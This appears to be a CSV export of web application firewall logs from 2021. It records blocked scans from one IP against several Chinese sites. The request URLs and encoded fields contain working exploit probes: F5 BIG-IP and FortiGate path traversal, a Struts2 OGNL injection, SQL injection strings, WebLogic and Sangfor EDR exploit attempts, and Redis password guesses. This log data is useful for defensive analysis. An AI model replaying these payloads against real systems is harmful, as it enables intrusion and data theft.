targetcity,sdate,postdata,ip,subtypeid,domain,vip,logflag,sips,targetcountry,targetprovince,city,src_port,province,platform,parameter,ruledesc,refer,eventid,starttime,wafhostname,xff,host,cookie,typeid,matchdata,newlog_time,url,type,rule,method,subtype,dst_port,actionflag,country,useragent,atdid
,2021-03-14T20:56:58,ZmlsZU5hbWU9JTJGZXRjJTJGZjUtcmVsZWFzZQ==,81.68.156.2,24013,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,40348,,anyu,-,F5 big ip any files read vuln,http://111.1.30.69:443/,1249-1615755418.298-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,24,L3RtdWkvbG9naW4uanNwLy4uOy90bXVpL2xvY2FsbGIvd29ya3NwYWNlL2ZpbGVSZWFkLmpzcA==,2021-03-14,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Other,Other_F5_001,POST,F5 Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:31:49,-,81.68.156.2,003,,121.32.243.71,-,,,,53982,,,-,request header invalid,-,1249-1615746709.821-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,59384,,,-,request method not valid,-,1249-1615746822.034-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokOQ0KMTEwMTIwMTE5DQo=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:10:06,-,81.68.156.2,24002,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33302,,anyu,-,backup backup,http://111.1.29.223:80/,1249-1615752606.174-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,24,L2JhY2t1cC5zcWwuZ3o=,2021-03-14,/backup.sql.gz,Other,backup backup,GET,Path Disallow,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:32:08,-,81.68.156.2,002,,121.32.243.71,-,,,,60146,,,-,09_method not valid,-,1249-1615746728.723-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIFJUU1AvMS4wDQoNCg==,2021-03-14,-,protocol invalidation,09_method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:43:07,-,81.68.156.2,002,,121.32.243.71,-,,,,49128,,,-,request method not valid,-,1249-1615750987.424-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:31:46,-,81.68.156.2,002,,121.32.243.71,-,,,,57774,,,-,request method not valid,-,1249-1615746705.334-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAAAYQADAAB1c2VyAGFkbQBjbGllbnRfZW5jb2RpbmcAVVRGOABleHRyYV9mbG9hdF9kaWdpdHMAMgBkYXRhYmFzZQBwb3N0Z3JlcwBkYXRlc3R5bGUASVNPLCBNRFkAAA==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:31:56,-,81.68.156.2,003,,121.32.243.71,-,,,,42324,,,-,request header invalid,-,1249-1615746716.198-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIEhUVFAvMS4wDQoNCg==,2021-03-14,/,protocol invalidation,no host header,OPTIONS,request header not valid,-,-,,-,0
,2021-03-14T18:32:23,-,81.68.156.2,003,,121.32.243.71,-,,,,42502,,,-,request header invalid,-,1249-1615746743.212-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIEhUVFAvMS4wDQoNCg==,2021-03-14,/,protocol invalidation,no host header,OPTIONS,request header not valid,-,-,,-,0
,2021-03-14T18:31:28,-,81.68.156.2,003,,121.32.243.71,-,,,,54654,,,-,request header invalid,-,1249-1615746688.098-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T18:32:19,-,81.68.156.2,002,,121.32.243.71,-,,,,58416,,,-,request method not valid,-,1249-1615746739.098-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:10:06,-,81.68.156.2,18089,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33302,,anyu,-,In Zend An attacker can get leak information with vuln,http://111.1.29.223:80/,1249-1615752606.403-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,18,-,2021-03-14,/application/configs/application.ini,Common Vulnerability,Framework_Zend_01,GET,Zend Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T19:37:31,-,81.68.156.2,23007,nhqzx.com,42.81.56.38,-,|DM117.149.146.17,,,,59178,,anyu,-,common scanner action,http://117.149.146.17:80/,1249-1615750651.785-w-waf04tjgt,0,w-waf04.anyu.tjgt.360es.cn,81.68.156.2,www.nhqzx.com,-,23,-,2021-03-14,/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en,SCANNER,scanner_action_03,GET,scanner action,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60326,,,-,request method not valid,-,1249-1615746821.935-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokOA0KYXMxMjM0NTYNCg==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:37:40,cm91dGVzdHJpbmc9YWpheC9yZW5kZXIvd2lkZ2V0X3BocCZ3aWRnZXRDb25maWclNWJjb2RlJTVkPXByaW50KG1kNSgyMDU3MTczODQ1KSklM2JleGl0JTNi,81.68.156.2,24001,nhqzx.com,42.81.56.38,-,|DM117.149.146.17,,,,59558,,anyu,-,md5() function encode,http://117.149.146.17:80/,1249-1615750660.361-w-waf03tjgt,0,w-waf03.anyu.tjgt.360es.cn,81.68.156.2,www.nhqzx.com,-,24,bWQ1KDIwNTcxNzM4NDUpKTtleGl0Ow==,2021-03-14,/,Other,md5_encode_01,POST,Other,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T19:43:07,-,81.68.156.2,002,,121.32.243.71,-,,,,48528,,,-,request method not valid,-,1249-1615750987.711-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:57,-,81.68.156.2,12001,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53438,,anyu,-,Backup File Attack,http://111.1.29.159:80/,1249-1615752596.99-s2czt,0,s2.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,12,LnN3cA==,2021-03-14,/.config.inc.php.swp,Backup File Attack,Backup_02,GET,Backup File Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T20:10:02,-,81.68.156.2,18056,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33302,,anyu,-,deserialize_with_Oracle_WebLogic_wls9_async_01,http://111.1.29.223:80/,1249-1615752602.531-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,18,-,2021-03-14,/_async/AsyncResponseService,Common Vulnerability,deserialize_with_Oracle_WebLogic_wls9_async_01,POST,weblogic Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60462,,,-,request method not valid,-,1249-1615746822.031-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokOA0KMTIzNDU2cXENCg==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:32,-,81.68.156.2,002,,121.32.243.71,-,,,,45088,,,-,request method not valid,-,1249-1615746752.958-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:54,-,81.68.156.2,13001,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53334,,anyu,-,Infomation Leak Attack,http://111.1.29.159:80/,1249-1615752594.071-s2czt,0,s2.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,13,LmdpdA==,2021-03-14,/.git/index,Information Leak Attack,Infomation_03,GET,Infomation Leak Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T20:10:05,-,81.68.156.2,18006,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,32930,,anyu,-,suspicious memberaccess use,http://111.1.29.223:443/,1249-1615752605.398-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,18,I19tZW1iZXJBY2Nlc3M=,2021-03-14,"/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(43634*43269),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse",Common Vulnerability,Framework_struts2_with_memberAccess_02,GET,Struts2 Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T19:43:05,-,81.68.156.2,002,,121.32.243.71,-,,,,37530,,,-,09_method not valid,-,1249-1615750983.267-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIFJUU1AvMS4wDQoNCg==,2021-03-14,-,protocol invalidation,09_method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:35:01,-,81.68.156.2,01009,jiaxing.gov.cn,121.32.243.71,-,|DM111.1.29.105,,,,47916,,anyu,-,get select sql injection,-,1249-1615746901.826-waf02fst,0,waf02.anyu.fst.360es.cn,81.68.156.2,whgdlyj1.jiaxing.gov.cn,-,01,U0VMRUNUIDEgRlJPTQ==,2021-03-14,"/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'",SQL Inject,uri_rule_41,GET,URI SQL Inject,8010,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:31:36,-,81.68.156.2,002,,121.32.243.71,-,,,,48706,,,-,request method not valid,-,1249-1615746695.829-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:09:48,eyJwYXJhbXMiOiJ3PTEyM1wiJzEyMzQxMjMnXCJ8aWQifQ==,81.68.156.2,18098,nela.gov.cn,61.160.224.57,-,|DM111.1.29.159,,,,53174,,anyu,-,In sangfor edr has rce vuln,http://111.1.29.159:80/,1249-1615752588.795-s3czt,0,s3.anyu.czt.360es.cn,81.68.156.2,www.nela.gov.cn,-,18,dG9rZW49ZXlKdFpEVWlPblJ5ZFdWOQ==,2021-03-14,/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9,Common Vulnerability,Framework_sangfor_edr_01,POST,sangfor Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,60754,,,-,request method not valid,-,1249-1615746822.045-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNw0KdGVzdDEyMw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:57:00,-,81.68.156.2,01001,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,40348,,anyu,-,get sql injection,http://111.1.30.69:443/,1249-1615755420.343-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,01,dW5pb24gc2VsZWN0,2021-03-14,"/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+41211*40871,1--+&site=admin",SQL Inject,get_rule_29,GET,Get SQL Inject,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:32:17,-,81.68.156.2,002,,121.32.243.71,-,,,,57692,,,-,request method not valid,-,1249-1615746737.302-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAwAABAAAAAAAAAAAAA=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,58430,,,-,request method not valid,-,1249-1615746822.021-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokOQ0KMTIzNjk4NzQ1DQo=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:43:15,-,81.68.156.2,002,,121.32.243.71,-,,,,57040,,,-,request method not valid,-,1249-1615750995.087-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAAAYQADAABleHRyYV9mbG9hdF9kaWdpdHMAMgBkYXRhYmFzZQBwb3N0Z3JlcwB1c2VyAGZ0cABjbGllbnRfZW5jb2RpbmcAVVRGOABkYXRlc3R5bGUASVNPLCBNRFkAAA==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:56:58,-,81.68.156.2,23007,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,40348,,anyu,-,common scanner action,http://111.1.30.69:443/,1249-1615755418.69-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,23,-,2021-03-14,/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession,SCANNER,scanner_action_03,GET,scanner action,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:31:46,-,81.68.156.2,002,,121.32.243.71,-,,,,57608,,,-,request method not valid,-,1249-1615746705.329-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AAAAYwADAABkYXRhYmFzZQBwb3N0Z3JlcwB1c2VyAGd1ZXN0AGNsaWVudF9lbmNvZGluZwBVVEY4AGRhdGVzdHlsZQBJU08sIE1EWQBleHRyYV9mbG9hdF9kaWdpdHMAMgAA,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:31:16,-,81.68.156.2,003,,121.32.243.71,-,,,,58638,,,-,request header invalid,-,1249-1615746676.553-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T20:10:03,-,81.68.156.2,18035,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,33302,,anyu,-,TongDaOA everyone can login 01,http://111.1.29.223:80/,1249-1615752603.413-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,18,-,2021-03-14,/general/login_code.php,Common Vulnerability,tongda_02,GET,TongDaOA Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:21,-,81.68.156.2,003,,121.32.243.71,-,,,,41730,,,-,request header invalid,-,1249-1615746801.799-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,59414,,,-,request method not valid,-,1249-1615746822.03-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokOQ0KMTIzNDU2YWJjDQo=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:31:51,-,81.68.156.2,003,,121.32.243.71,-,,,,41804,,,-,request header invalid,-,1249-1615746711.728-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
